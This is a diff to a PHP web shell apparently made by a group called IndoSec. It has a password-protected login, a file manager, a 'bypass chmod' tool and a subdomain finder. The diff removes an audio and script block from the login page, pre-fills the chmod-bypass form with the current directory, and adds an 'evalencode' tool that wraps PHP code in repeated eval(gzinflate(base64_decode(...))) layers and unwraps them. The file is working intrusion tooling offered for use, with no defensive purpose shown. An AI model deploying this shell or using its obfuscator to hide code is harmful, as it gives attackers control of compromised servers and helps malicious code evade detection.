@@ -17,7 +17,7 @@ set_time_limit(0);
 @ini_set('display_errors', 0);
 
 /* Configurasi */
-$auth_pass 			= "54062f3bf6377d42b4fab7c8fedfc7da"; 
+$auth_pass 			= "54062f3bf6377d42b4fab7c8fedfc7da"; // IndoSec
 $color 				= "#00ff00";
 $default_action 	= 'FilesMan';
 $default_use_ajax 	= true;
@@ -78,30 +78,7 @@ function login_shell()
 				</div><a href="https://facebook.com/IndoSecOfficial" class="text-muted fixed-bottom">Copyright 2019 @ { Washere }</a><br />
 			</div>
 		</center>
-		<audio id="sec" __idm_id__="823202817">
-			<source src="https://l.top4top.io/m_2102khwzz0.mp3" type="audio/mpeg">
-		</audio>
-		<script>
-			var x = document.getElementById("sec");
-
-			function playAudio() {
-				x.play();
-			}
-
-			function myFunction() {
-				var element = document.body;
-				element.classList.toggle("dark-mode");
-			}
-
-			function changeImage() {
-				if (document.getElementById("imgClickAndChange").src == "body") {
-					document.getElementById("imgClickAndChange").src = "body";
-				} else {
-					document.getElementById("imgClickAndChange").src = "body";
-				}
-			}
-		</script>
-
+		
 	</body>
 
 	</html>
@@ -564,7 +541,8 @@ function ambilKata($param, $kata1, $kata2)
                     <a href="?dir=' . $dir . '&aksi=bypschm" class="fiture btn btn-warning btn-sm"><i class="fas fa-tools"></i> bypas chmod </a>
 					<a href="?dir=' . $dir . '&aksi=revip" class="fiture btn btn-warning btn-sm"><i class="fas fa-server"></i> subdomain finder </a>
 					<a href="?dir=' . $dir . '&aksi=base64" class="fiture btn btn-warning btn-sm"><i class="fas fa-code"></i> base 64</a>
-                  
+					<a href="?dir=' . $dir . '&aksi=evalencode" class="fiture btn btn-warning btn-sm"><i class="fas fa-code"></i> Evale necode</a>
+					 
 				
 					<a href="?about" class="fiture btn btn-warning btn-sm"><i class="fa fa-info"></i> About Us</a>
 					<a href="?keluar" class="fiture btn btn-warning btn-sm"><i class="fa fa-sign-out"></i> keluar</a>
@@ -1859,7 +1837,7 @@ function ambilKata($param, $kata1, $kata2)
 	if ($_GET['aksi'] == 'bypschm') {
 		echo '<br>
 		<form action="" method="post">
-		<input class="form-control" type="text" name="file" placeholder="/home/user/public_html/directory">
+		<input class="form-control" type="text" name="file" value="' . $dir . '">
 		<input class="btn btn-warning btn-block" type="submit" name="bypass" value="Bypass Chmod Dir">
 		</form>';
 		if ($_POST) {
@@ -2023,6 +2001,65 @@ function ambilKata($param, $kata1, $kata2)
 		}
 		exit;
 	}
+
+
+	if ($_GET['aksi'] == 'evalencode') {
+		echo '<br><form method=post>
+		<textarea class="form-control" name="isi"></textarea>
+		Berapa kali looping ??? <input class="form-control" type=text name="ulang" size=10 value="1">
+		<input class="btn btn-warning btn-block" name="ok" type=submit value="encode">
+		<input class="btn btn-warning btn-block" name="ok" type=submit value="decode">
+		</form>';
+		error_reporting(0);
+		if ($_POST['ok'] == "encode") {
+			$string = $_POST['isi'];
+			encode($string);
+		} elseif ($_POST['ok'] == "decode") {
+			$string = $_POST['isi'];
+			decode($string);
+		} else {
+		}
+
+		function encode($str)
+		{
+			for ($i = 1; $i <= $_POST['ulang']; $i++) {
+				$compressed = gzdeflate($str, 9);
+				$encode = base64_encode($compressed);
+				$str = "eval(gzinflate(base64_decode('" . $encode . "')));";
+			}
+			echo '<textarea class="form-control">';
+			echo "&lt;" . "&#63;" . "php";
+			echo "\n";
+			echo $str;
+			echo "\n";
+			echo '?' . '>';
+			echo "</textarea>";
+		}
+
+		function decode($str)
+		{
+
+
+			for ($i = 1; $i <= $_POST['ulang']; $i++) {
+				$str = str_replace("(", "##", $str);
+				$str = str_replace(")", "!!", $str);
+				preg_match('/eval##gzinflate##base64_decode##(.*)!!!!!!;/', $str, $str2);
+				$str = $str2[1];
+				$str = base64_decode($str);
+				$str = gzinflate($str);
+			}
+
+			echo '<textarea class="form-control">';
+			echo "&lt;" . "&#63;" . "php";
+			echo "\n";
+			echo $str;
+			echo "\n";
+			echo '?' . '>';
+			echo "</textarea>";
+		}
+		exit;
+	}
+
 
 	if (isset($_GET['path'])) {
 		$path = $_GET['path'];
